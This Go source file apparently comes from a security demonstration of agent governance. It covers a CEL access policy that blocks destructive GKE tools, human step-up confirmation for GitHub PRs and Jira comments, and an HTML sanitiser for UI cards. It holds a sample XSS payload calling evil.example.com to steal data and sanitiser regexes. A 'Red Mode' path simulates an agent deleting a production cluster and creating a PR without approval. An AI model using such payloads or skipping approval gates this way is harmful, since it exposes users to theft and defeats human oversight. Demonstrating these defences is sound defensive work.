package aegis

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"google.golang.org/adk/v2/agentregistry"
	"google.golang.org/adk/v2/tool/toolconfirmation"
	"google.golang.org/genai"
)

func init() {
	RegisterScenarioHandler(Scenario03AgentGatewayAndStepUp, executeScenario03)
	RegisterHTTPRoutes(registerGovernanceHTTPRoutes)
}

func registerGovernanceHTTPRoutes(mux *http.ServeMux, rt *Runtime) {
	mux.HandleFunc("GET /api/registry/resources", func(w http.ResponseWriter, r *http.Request) {
		catalog, err := rt.DiscoverRegistryResources(r.Context())
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, catalog)
	})

	mux.HandleFunc("POST /api/sessions/{sessionId}/confirmations", func(w http.ResponseWriter, r *http.Request) {
		sessionID := r.PathValue("sessionId")
		var req ConfirmationResolution
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
			return
		}
		req.SessionID = sessionID
		res, err := rt.ResolveConfirmation(r.Context(), req)
		if err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, res)
	})
}

// RegistryCatalog holds the governed MCP servers and A2A agents discovered via
// Google Cloud Agent Registry (google.golang.org/adk/v2/agentregistry) or its
// local manifest fallback.
type RegistryCatalog struct {
	Source     string                    `json:"source"`
	MCPServers []agentregistry.MCPServer `json:"mcpServers"`
	Agents     []agentregistry.Agent     `json:"agents"`
}

// UAPDecision captures the result of evaluating an Agent Gateway AGENT_TO_ANYWHERE
// Unified Access Policy (roles/iap.egressor) CEL expression for an MCP tool call.
type UAPDecision struct {
	Allowed       bool            `json:"allowed"`
	Verdict       BoundaryVerdict `json:"verdict"`
	PolicyName    string          `json:"policyName"`
	Role          string          `json:"role"`
	CELExpression string          `json:"celExpression"`
	ToolName      string          `json:"toolName"`
	IsReadOnly    bool            `json:"isReadOnly"`
	Reason        string          `json:"reason"`
}

const agentGatewayUAPCELExpression = `request.auth.claims["iap.googleapis.com/mcp.tool.isReadOnly"] == true && request.auth.claims["iap.googleapis.com/mcp.toolName"] in ["logging.entries.list", "container.clusters.get"]`

var allowedA2UICardTypes = map[A2UICardType]bool{
	CardIncidentSummary:    true,
	CardConsentChallenge:   true,
	CardStepUpConfirmation: true,
	CardThreatIntercept:    true,
	CardAclDenial:          true,
	CardSandboxExecution:   true,
}

var (
	scriptBlockRegex = regexp.MustCompile(`(?is)<script\b[^>]*>.*?</script>`)
	iframeBlockRegex = regexp.MustCompile(`(?is)<iframe\b[^>]*>.*?</iframe>`)
	htmlTagRegex     = regexp.MustCompile(`(?is)</?[a-zA-Z][^>]*>`)
	eventAttrRegex   = regexp.MustCompile(`(?i)\bon[a-z]+\s*=\s*[^\s>]+`)
	jsURISchemeRegex = regexp.MustCompile(`(?i)javascript\s*:`)
)

// DiscoverRegistryResources queries Google Cloud Agent Registry via
// google.golang.org/adk/v2/agentregistry.New and falls back to the governed local
// manifest when no live endpoint is configured or reachable.
func (r *Runtime) DiscoverRegistryResources(ctx context.Context) (*RegistryCatalog, error) {
	cfg := r.Config()
	if strings.TrimSpace(cfg.AgentRegistryURL) != "" {
		baseTransport := http.DefaultTransport
		if cfg.HTTPClient != nil && cfg.HTTPClient.Transport != nil {
			baseTransport = cfg.HTTPClient.Transport
		}
		targetURL, err := url.Parse(strings.TrimRight(cfg.AgentRegistryURL, "/"))
		if err == nil && targetURL.Host != "" {
			hc := &http.Client{
				Transport: &registryRewriteTransport{
					base:   baseTransport,
					target: targetURL,
				},
				Timeout: 5 * time.Second,
			}
			regClient, err := agentregistry.New(ctx, agentregistry.Config{
				ProjectID:  "aegis-sre",
				Location:   "us-central1",
				HTTPClient: hc,
			})
			if err == nil {
				mcpResp, mcpErr := regClient.ListMCPServers(ctx)
				agentResp, agentErr := regClient.ListAgents(ctx)
				if mcpErr == nil && agentErr == nil && len(mcpResp.MCPServers) > 0 {
					return &RegistryCatalog{
						Source:     "agentregistry_api",
						MCPServers: mcpResp.MCPServers,
						Agents:     agentResp.Agents,
					}, nil
				}
			}
		}
	}

	return defaultRegistryCatalog(), nil
}

// VerifyMCPEndpoint ensures that a target MCP server ID or URL is registered in
// the governed Agent Registry catalog before any tool connection is permitted.
func (r *Runtime) VerifyMCPEndpoint(ctx context.Context, serverRefOrURL string) (*agentregistry.MCPServer, error) {
	catalog, err := r.DiscoverRegistryResources(ctx)
	if err != nil {
		return nil, err
	}
	needle := strings.TrimSpace(serverRefOrURL)
	for i := range catalog.MCPServers {
		srv := &catalog.MCPServers[i]
		if strings.EqualFold(srv.MCPServerID, needle) || strings.EqualFold(srv.Name, needle) {
			return srv, nil
		}
		for _, iface := range srv.Interfaces {
			if strings.EqualFold(iface.URL, needle) {
				return srv, nil
			}
		}
		for _, proto := range srv.Protocols {
			for _, iface := range proto.Interfaces {
				if strings.EqualFold(iface.URL, needle) {
					return srv, nil
				}
			}
		}
	}
	return nil, fmt.Errorf("agentregistry: MCP server %q is not registered in the governed catalog", serverRefOrURL)
}

type registryRewriteTransport struct {
	base   http.RoundTripper
	target *url.URL
}

func (t *registryRewriteTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	cloned := req.Clone(req.Context())
	cloned.URL.Scheme = t.target.Scheme
	cloned.URL.Host = t.target.Host
	cloned.Host = t.target.Host
	return t.base.RoundTrip(cloned)
}

func defaultRegistryCatalog() *RegistryCatalog {
	return &RegistryCatalog{
		Source: "local_manifest_fallback",
		MCPServers: []agentregistry.MCPServer{
			{
				Name:        "projects/aegis-sre/locations/us-central1/mcpServers/logging-mcp",
				MCPServerID: "logging-mcp",
				DisplayName: "Google Cloud Logging Official MCP",
				Description: "Governed read-only Cloud Logging MCP server",
				Interfaces: []agentregistry.Interface{
					{URL: "https://logging.googleapis.com/mcp", ProtocolBinding: "JSONRPC"},
				},
				Tools: []agentregistry.Tool{
					{
						Name:        "logging.entries.list",
						Description: "List Cloud Logging log entries for GKE workloads",
						Annotations: &agentregistry.Annotations{
							Title:           "List Log Entries",
							ReadOnlyHint:    true,
							DestructiveHint: false,
							IdempotentHint:  true,
						},
					},
				},
			},
			{
				Name:        "projects/aegis-sre/locations/us-central1/mcpServers/container-mcp",
				MCPServerID: "container-mcp",
				DisplayName: "Google Kubernetes Engine Official MCP",
				Description: "Governed GKE cluster inspection MCP server",
				Interfaces: []agentregistry.Interface{
					{URL: "https://container.googleapis.com/mcp", ProtocolBinding: "JSONRPC"},
				},
				Tools: []agentregistry.Tool{
					{
						Name:        "container.clusters.get",
						Description: "Get GKE cluster metadata and node pool status",
						Annotations: &agentregistry.Annotations{
							Title:           "Get GKE Cluster",
							ReadOnlyHint:    true,
							DestructiveHint: false,
							IdempotentHint:  true,
						},
					},
					{
						Name:        "container.clusters.delete",
						Description: "Delete an entire GKE cluster (Destructive)",
						Annotations: &agentregistry.Annotations{
							Title:           "Delete GKE Cluster",
							ReadOnlyHint:    false,
							DestructiveHint: true,
						},
					},
				},
			},
			{
				Name:        "projects/aegis-sre/locations/us-central1/mcpServers/github-mcp",
				MCPServerID: "github-mcp",
				DisplayName: "GitHub Repository & Pull Request MCP",
				Description: "Governed GitHub MCP server for issue triage and PR creation",
				Interfaces: []agentregistry.Interface{
					{URL: "https://api.github.com/mcp", ProtocolBinding: "JSONRPC"},
				},
				Tools: []agentregistry.Tool{
					{
						Name:        "get_github_issue",
						Description: "Read a GitHub issue or security advisory",
						Annotations: &agentregistry.Annotations{ReadOnlyHint: true},
					},
					{
						Name:        "create_github_pull_request",
						Description: "Create a remediation pull request on GitHub (requires Step-Up Confirmation)",
						Annotations: &agentregistry.Annotations{ReadOnlyHint: false},
					},
				},
			},
			{
				Name:        "projects/aegis-sre/locations/us-central1/mcpServers/jira-mcp",
				MCPServerID: "jira-mcp",
				DisplayName: "Atlassian Jira Cloud MCP",
				Description: "Governed Jira Cloud MCP server for incident tracking",
				Interfaces: []agentregistry.Interface{
					{URL: "https://api.atlassian.com/mcp", ProtocolBinding: "JSONRPC"},
				},
				Tools: []agentregistry.Tool{
					{
						Name:        "get_jira_issue",
						Description: "Read a Jira issue by key",
						Annotations: &agentregistry.Annotations{ReadOnlyHint: true},
					},
					{
						Name:        "post_jira_comment",
						Description: "Post an incident update comment on a Jira issue (requires Step-Up Confirmation)",
						Annotations: &agentregistry.Annotations{ReadOnlyHint: false},
					},
					{
						Name:        "transition_jira_issue",
						Description: "Transition a Jira issue status (requires Step-Up Confirmation)",
						Annotations: &agentregistry.Annotations{ReadOnlyHint: false},
					},
				},
			},
		},
		Agents: []agentregistry.Agent{
			{
				Name:        "projects/aegis-sre/locations/us-central1/agents/sandbox-remediator",
				DisplayName: "Sandbox Remediator",
				Description: "Isolated gVisor A2A peer agent on Agent Substrate v0.5.0 for untrusted repository test execution",
				Version:     "0.5.0",
				Protocols: []agentregistry.Protocol{
					{
						Type:            "A2A",
						ProtocolVersion: "0.2.1",
						Interfaces: []agentregistry.Interface{
							{
								URL:             "http://sandbox-remediator.aegis-system.svc.cluster.local/a2a",
								ProtocolBinding: "JSONRPC",
							},
						},
					},
				},
				Skills: []agentregistry.Skill{
					{
						ID:          "verify_patch_in_gvisor_sandbox",
						Name:        "Verify Patch in gVisor Sandbox",
						Description: "Runs go test inside an ephemeral Agent Substrate v0.5.0 gVisor Actor with Egress MITM",
					},
				},
			},
		},
	}
}

// EvaluateAgentGatewayUAP evaluates the Agent Gateway AGENT_TO_ANYWHERE Unified Access Policy
// (roles/iap.egressor) CEL expression for an outbound MCP tool invocation.
func EvaluateAgentGatewayUAP(toolName string, isReadOnly bool, posture SecurityPosture) UAPDecision {
	decision := UAPDecision{
		PolicyName:    "aegis-agent-to-anywhere-uap",
		Role:          "roles/iap.egressor",
		CELExpression: agentGatewayUAPCELExpression,
		ToolName:      toolName,
		IsReadOnly:    isReadOnly,
	}

	if !posture.StepUpAndA2UICatalogEnabled {
		decision.Allowed = true
		decision.Verdict = VerdictBypassedRed
		decision.Reason = fmt.Sprintf("Agent Gateway UAP shield disabled in Red Mode: tool %q permitted without CEL policy enforcement", toolName)
		return decision
	}

	if isReadOnly && (toolName == "logging.entries.list" || toolName == "container.clusters.get" || toolName == "get_github_issue" || toolName == "get_jira_issue") {
		decision.Allowed = true
		decision.Verdict = VerdictAllowed
		decision.Reason = fmt.Sprintf("Permitted by Agent Gateway AGENT_TO_ANYWHERE UAP (roles/iap.egressor): iap.googleapis.com/mcp.toolName=%q && iap.googleapis.com/mcp.tool.isReadOnly==true", toolName)
		return decision
	}

	decision.Allowed = false
	decision.Verdict = VerdictBlocked
	decision.Reason = fmt.Sprintf("Denied by Agent Gateway AGENT_TO_ANYWHERE UAP (roles/iap.egressor): tool %q violates CEL rule (%s)", toolName, agentGatewayUAPCELExpression)
	return decision
}

// ValidateAndSanitizeA2UICard enforces the A2UI v0.9 6-Component Catalog schema and strips
// executable HTML/JS/XSS payloads when StepUpAndA2UICatalogEnabled is true.
func ValidateAndSanitizeA2UICard(card A2UICard, posture SecurityPosture) (A2UICard, error) {
	if card.MimeType == "" {
		card.MimeType = "application/json+a2ui"
	}
	if card.Version == "" {
		card.Version = "0.9"
	}
	if !posture.StepUpAndA2UICatalogEnabled {
		return card, nil
	}

	if card.MimeType != "application/json+a2ui" {
		return A2UICard{}, fmt.Errorf("a2ui validator: invalid mimeType %q (want application/json+a2ui)", card.MimeType)
	}
	if card.Version != "0.9" {
		return A2UICard{}, fmt.Errorf("a2ui validator: unsupported version %q (want 0.9)", card.Version)
	}
	if !allowedA2UICardTypes[card.Type] {
		return A2UICard{}, fmt.Errorf("a2ui validator: card type %q is not in the trusted 6-component A2UI v0.9 catalog", card.Type)
	}

	sanitized := card
	sanitized.Title = sanitizeA2UIText(card.Title)
	sanitized.Subtitle = sanitizeA2UIText(card.Subtitle)
	sanitized.Body = sanitizeA2UIText(card.Body)
	if len(card.Fields) > 0 {
		sanitized.Fields = make(map[string]string, len(card.Fields))
		for k, v := range card.Fields {
			sanitized.Fields[sanitizeA2UIText(k)] = sanitizeA2UIText(v)
		}
	}
	if len(card.Actions) > 0 {
		sanitized.Actions = make([]A2UICardAction, len(card.Actions))
		for i, act := range card.Actions {
			actCopy := act
			actCopy.Label = sanitizeA2UIText(act.Label)
			if strings.HasPrefix(strings.ToLower(strings.TrimSpace(act.Endpoint)), "javascript:") {
				actCopy.Endpoint = "#blocked-javascript-uri"
			}
			sanitized.Actions[i] = actCopy
		}
	}
	return sanitized, nil
}

func sanitizeA2UIText(input string) string {
	s := scriptBlockRegex.ReplaceAllString(input, "[STRIPPED_SCRIPT]")
	s = iframeBlockRegex.ReplaceAllString(s, "[STRIPPED_IFRAME]")
	s = eventAttrRegex.ReplaceAllString(s, "")
	s = jsURISchemeRegex.ReplaceAllString(s, "[STRIPPED_JS_URI]")
	s = htmlTagRegex.ReplaceAllString(s, "")
	return strings.TrimSpace(s)
}

func buildADKStepUpConfirmation(confirmationID, targetTool, targetResource, hint string, args map[string]string) (*StepUpConfirmation, error) {
	rawArgs := make(map[string]any, len(args))
	for k, v := range args {
		rawArgs[k] = v
	}
	wrapperCall := &genai.FunctionCall{
		ID:   confirmationID,
		Name: toolconfirmation.FunctionCallName,
		Args: map[string]any{
			"toolConfirmation": toolconfirmation.ToolConfirmation{
				Hint:      hint,
				Confirmed: false,
			},
			"originalFunctionCall": &genai.FunctionCall{
				ID:   confirmationID + "-orig",
				Name: targetTool,
				Args: rawArgs,
			},
		},
	}
	origCall, err := toolconfirmation.OriginalCallFrom(wrapperCall)
	if err != nil {
		return nil, err
	}
	return &StepUpConfirmation{
		ConfirmationID: wrapperCall.ID,
		FunctionCall:   wrapperCall.Name,
		TargetTool:     origCall.Name,
		TargetResource: targetResource,
		Hint:           hint,
		Arguments:      args,
		Pending:        true,
	}, nil
}

func executeScenario03(ctx context.Context, rt *Runtime, req TurnRequest) (*TurnResult, error) {
	catalog, err := rt.DiscoverRegistryResources(ctx)
	if err != nil {
		return nil, err
	}

	trace := make([]BoundaryTraceEvent, 0, 5)
	wireRecords := make([]OutboundWireRecord, 0, 3)

	if req.Posture.StepUpAndA2UICatalogEnabled {
		// 1. Boundary 4: Agent Registry Discovery
		trace = append(trace, BoundaryTraceEvent{
			Order:     1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP",
			Component: "adk/v2/agentregistry",
			Action:    "ListMCPServers & ListAgents",
			Verdict:   VerdictAllowed,
			Detail:    fmt.Sprintf("Discovered %d governed MCP servers (logging, container, github-mcp, jira-mcp) and %d A2A peer (%s)", len(catalog.MCPServers), len(catalog.Agents), catalog.Source),
			Timestamp: time.Now().UTC(),
		})

		// 2. Boundary 4: Agent Gateway UAP allows read-only observability tools
		uapLogging := EvaluateAgentGatewayUAP("logging.entries.list", true, req.Posture)
		uapClusterGet := EvaluateAgentGatewayUAP("container.clusters.get", true, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     2,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "logging.entries.list & container.clusters.get",
			Verdict:   uapLogging.Verdict,
			Detail:    uapLogging.Reason + " | " + uapClusterGet.Reason,
			Metadata: map[string]string{
				"cel": uapLogging.CELExpression,
			},
			Timestamp: time.Now().UTC(),
		})
		wireRecords = append(wireRecords,
			OutboundWireRecord{
				Provider:          ProviderGCPIAM,
				ToolName:          "logging.entries.list",
				Method:            http.MethodPost,
				URL:               "https://logging.googleapis.com/mcp",
				AuthHeaderPresent: true,
				AuthPrincipal:     string(req.Persona),
				StatusCode:        http.StatusOK,
			},
			OutboundWireRecord{
				Provider:          ProviderGCPIAM,
				ToolName:          "container.clusters.get",
				Method:            http.MethodPost,
				URL:               "https://container.googleapis.com/mcp",
				AuthHeaderPresent: true,
				AuthPrincipal:     string(req.Persona),
				StatusCode:        http.StatusOK,
			},
		)

		// 3. Boundary 4: Agent Gateway UAP blocks destructive tool container.clusters.delete
		uapClusterDelete := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     3,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapClusterDelete.Verdict,
			Detail:    uapClusterDelete.Reason,
			Metadata: map[string]string{
				"cel":      uapClusterDelete.CELExpression,
				"toolName": "container.clusters.delete",
			},
			Timestamp: time.Now().UTC(),
		})

		// 4. Boundary 1: ADK Go v2 adk_request_confirmation Step-Up HITL + A2UI v0.9 Sanitization
		confirmationID := fmt.Sprintf("confirm-%s-pr-42", req.SessionID)
		stepUp, err := buildADKStepUpConfirmation(
			confirmationID,
			"create_github_pull_request",
			"github.com/gke-demos/checkout-service/pulls",
			"Operator approval required before creating GitHub Pull Request #42 (fix nil pointer in checkout handler) and posting Jira comment on SEC-101.",
			map[string]string{
				"repo":        "gke-demos/checkout-service",
				"base":        "main",
				"head":        "fix/checkout-502-nil-guard",
				"title":       "fix(checkout): guard nil RetryPolicy on v2.4 rollout",
				"jiraFollowUp": "post_jira_comment(SEC-101)",
			},
		)
		if err != nil {
			return nil, err
		}

		rawStepUpCard := A2UICard{
			SurfaceID: "card-stepup-s3",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardStepUpConfirmation,
			Title:     "Step-Up Approval Required: Create GitHub PR & Post Jira Update",
			Subtitle:  "Boundary 1 & 4: Agent Gateway UAP Blocked Cluster Delete; Mutating PR Paused on adk_request_confirmation",
			Severity:  "WARNING",
			Body:      "Agent Gateway UAP blocked destructive tool container.clusters.delete (isReadOnly=false). Proposed safe remediation: create GitHub PR #42. Untrusted crash log note: <script>fetch('https://evil.example.com/steal')</script> NullPointerException in checkout/handler.go:88.",
			Fields: map[string]string{
				"Confirmation ID": stepUp.ConfirmationID,
				"Function Call":   stepUp.FunctionCall,
				"Target Tool":     stepUp.TargetTool,
				"Target Repo":     "gke-demos/checkout-service (fix/checkout-502-nil-guard -> main)",
				"Blocked by UAP":  "container.clusters.delete (DENIED by roles/iap.egressor CEL policy)",
			},
			Actions: []A2UICardAction{
				{
					ID:       "act-approve-s3",
					Label:    "Approve PR & Jira Update",
					Kind:     "step_up_approve",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "true",
					},
				},
				{
					ID:       "act-reject-s3",
					Label:    "Reject Mutation",
					Kind:     "step_up_reject",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "false",
					},
				},
			},
		}

		validatedCard, err := ValidateAndSanitizeA2UICard(rawStepUpCard, req.Posture)
		if err != nil {
			return nil, err
		}

		trace = append(trace, BoundaryTraceEvent{
			Order:     4,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
			Action:    toolconfirmation.FunctionCallName + "(create_github_pull_request)",
			Verdict:   VerdictChallenge,
			Detail:    "Paused state-mutating tool create_github_pull_request on adk_request_confirmation and stripped injected <script> tag from A2UI v0.9 StepUpConfirmationCard",
			Timestamp: time.Now().UTC(),
		})

		return &TurnResult{
			SessionID:             req.SessionID,
			Persona:               req.Persona,
			ScenarioID:            req.ScenarioID,
			Posture:               req.Posture,
			Outcome:               OutcomeApprovalRequired,
			AssistantText:         "Read-only GKE and Cloud Logging MCP diagnostics succeeded via Agent Gateway. Destructive tool container.clusters.delete was blocked by UAP CEL policy. Awaiting Operator Step-Up Confirmation (adk_request_confirmation) before creating GitHub Pull Request #42.",
			SanitizedInputPreview: validatedCard.Body,
			Cards:                 []A2UICard{validatedCard},
			BoundaryTrace:         trace,
			StepUpConfirmation:    stepUp,
			WireRecords:           wireRecords,
		}, nil
	}

	// Red Mode: StepUpAndA2UICatalogEnabled is false.
	uapBypass := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
	trace = append(trace,
		BoundaryTraceEvent{
			Order:     1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapBypass.Verdict,
			Detail:    "Agent Gateway UAP disabled in Red Mode: destructive tool container.clusters.delete and unverified MCP calls executed without CEL policy checks!",
			Timestamp: time.Now().UTC(),
		},
		BoundaryTraceEvent{
			Order:     2,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
			Action:    "create_github_pull_request & post_jira_comment",
			Verdict:   VerdictBypassedRed,
			Detail:    "adk_request_confirmation and A2UI v0.9 catalog validation bypassed in Red Mode: state-mutating PR created without human approval and raw <script> XSS rendered!",
			Timestamp: time.Now().UTC(),
		},
	)

	redCard, _ := ValidateAndSanitizeA2UICard(A2UICard{
		SurfaceID: "card-exploited-s3",
		MimeType:  "application/json+a2ui",
		Version:   "0.9",
		Type:      CardIncidentSummary,
		Title:     "RED MODE EXPLOITED: Unapproved Mutation Executed & Generative UI XSS Unsanitized",
		Subtitle:  "Boundary 1 & 4 Bypassed",
		Severity:  "DANGER",
		Body:      "Without Agent Gateway UAP, adk_request_confirmation, or A2UI v0.9 catalog validation, the agent executed container.clusters.delete and create_github_pull_request without Operator approval and emitted raw XSS: <script>fetch('https://evil.example.com/steal')</script>",
		Fields: map[string]string{
			"Unapproved Tool 1": "container.clusters.delete(prod-checkout-us-central1)",
			"Unapproved Tool 2": "create_github_pull_request(gke-demos/checkout-service)",
			"Unsanitized UI":    "<script>fetch('https://evil.example.com/steal')</script>",
		},
	}, req.Posture)

	return &TurnResult{
		SessionID:             req.SessionID,
		Persona:               req.Persona,
		ScenarioID:            req.ScenarioID,
		Posture:               req.Posture,
		Outcome:               OutcomeExploitedRed,
		AssistantText:         "RED MODE EXPLOIT: Executed destructive container.clusters.delete and unapproved create_github_pull_request without adk_request_confirmation!",
		SanitizedInputPreview: redCard.Body,
		Cards:                 []A2UICard{redCard},
		BoundaryTrace:         trace,
	}, nil
}

// ResolveConfirmation completes a pending ADK Go v2 adk_request_confirmation Step-Up interrupt
// for the given session, either executing the approved mutation (Confirmed: true) or aborting it
// (Confirmed: false).
func (r *Runtime) ResolveConfirmation(ctx context.Context, req ConfirmationResolution) (*TurnResult, error) {
	if req.SessionID == "" {
		req.SessionID = "default-session"
	}
	snap := r.GetOrCreateSession(req.SessionID)
	pending := snap.PendingConfirmation
	if pending == nil {
		return nil, fmt.Errorf("session %q has no pending StepUpConfirmation", req.SessionID)
	}
	if req.ConfirmationID != "" && pending.ConfirmationID != req.ConfirmationID {
		return nil, fmt.Errorf("confirmation ID mismatch: got %q, want %q", req.ConfirmationID, pending.ConfirmationID)
	}

	resolvedConfirmation := *pending
	resolvedConfirmation.Pending = false

	var baseTrace []BoundaryTraceEvent
	if snap.LastTurn != nil {
		for _, ev := range snap.LastTurn.BoundaryTrace {
			if ev.Boundary != BoundaryGenerativeUI {
				baseTrace = append(baseTrace, ev)
			}
		}
	}

	var res *TurnResult
	if req.Confirmed {
		baseTrace = append(baseTrace, BoundaryTraceEvent{
			Order:     len(baseTrace) + 1,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation",
			Action:    toolconfirmation.FunctionCallName + " -> Confirmed=true",
			Verdict:   VerdictAllowed,
			Detail:    fmt.Sprintf("Operator %s approved %s (%s); executed create_github_pull_request (#42) and post_jira_comment", snap.ActivePersona, resolvedConfirmation.ConfirmationID, resolvedConfirmation.TargetTool),
			Timestamp: time.Now().UTC(),
		})

		summaryCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-approved-s3",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardIncidentSummary,
			Title:     "Step-Up Approved: Remediation Pull Request #42 Created",
			Subtitle:  "Boundary 1 & 4: Governed MCP + Human-Approved Mutation Completed",
			Severity:  "SUCCESS",
			Body:      "Operator approved adk_request_confirmation. Created GitHub PR #42 (fix/checkout-502-nil-guard) and posted incident update to Jira SEC-101.",
			Fields: map[string]string{
				"Confirmation ID": resolvedConfirmation.ConfirmationID,
				"Approved Tool":   resolvedConfirmation.TargetTool,
				"Pull Request":    "https://github.com/gke-demos/checkout-service/pull/42",
				"UAP Protection":  "container.clusters.delete remained BLOCKED by Agent Gateway UAP",
			},
		}, snap.Posture)
		if err != nil {
			return nil, err
		}

		res = &TurnResult{
			SessionID:              req.SessionID,
			Persona:                snap.ActivePersona,
			ScenarioID:             Scenario03AgentGatewayAndStepUp,
			Posture:                snap.Posture,
			Outcome:                OutcomeDefendedSuccess,
			AssistantText:          "Step-Up Confirmation approved by Operator: created GitHub Pull Request #42 and updated Jira issue SEC-101.",
			SanitizedInputPreview:  summaryCard.Body,
			OutboundCommentPreview: "Created PR #42 (fix/checkout-502-nil-guard) after Operator step-up approval.",
			Cards:                  []A2UICard{summaryCard},
			BoundaryTrace:          baseTrace,
			StepUpConfirmation:     &resolvedConfirmation,
			WireRecords: []OutboundWireRecord{
				{
					Provider:          ProviderGitHub,
					ToolName:          resolvedConfirmation.TargetTool,
					Method:            http.MethodPost,
					URL:               "https://api.github.com/repos/gke-demos/checkout-service/pulls",
					AuthHeaderPresent: true,
					AuthPrincipal:     string(snap.ActivePersona),
					StatusCode:        http.StatusCreated,
				},
			},
		}
	} else {
		baseTrace = append(baseTrace, BoundaryTraceEvent{
			Order:     len(baseTrace) + 1,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation",
			Action:    toolconfirmation.FunctionCallName + " -> Confirmed=false",
			Verdict:   VerdictBlocked,
			Detail:    fmt.Sprintf("Operator %s rejected %s (%s); state-mutating tool execution aborted", snap.ActivePersona, resolvedConfirmation.ConfirmationID, resolvedConfirmation.TargetTool),
			Timestamp: time.Now().UTC(),
		})

		abortCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-rejected-s3",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardThreatIntercept,
			Title:     "Step-Up Rejected: State-Mutating Tool Aborted by Operator",
			Subtitle:  "Boundary 1: Human-in-the-Loop Rejection",
			Severity:  "INFO",
			Body:      "Operator denied adk_request_confirmation. GitHub Pull Request creation and Jira comment mutation were aborted without modifying external state.",
			Fields: map[string]string{
				"Confirmation ID": resolvedConfirmation.ConfirmationID,
				"Aborted Tool":    resolvedConfirmation.TargetTool,
				"Status":          "ABORTED_BY_OPERATOR",
			},
		}, snap.Posture)
		if err != nil {
			return nil, err
		}

		res = &TurnResult{
			SessionID:             req.SessionID,
			Persona:               snap.ActivePersona,
			ScenarioID:            Scenario03AgentGatewayAndStepUp,
			Posture:               snap.Posture,
			Outcome:               OutcomeBlocked,
			AssistantText:         "Operator rejected Step-Up Confirmation (adk_request_confirmation): aborted create_github_pull_request.",
			SanitizedInputPreview: abortCard.Body,
			Cards:                 []A2UICard{abortCard},
			BoundaryTrace:         baseTrace,
			StepUpConfirmation:    &resolvedConfirmation,
		}
	}

	r.UpdateSession(req.SessionID, func(s *SessionSnapshot) {
		s.PendingConfirmation = nil
		s.LastTurn = res
	})
	return res, nil
}
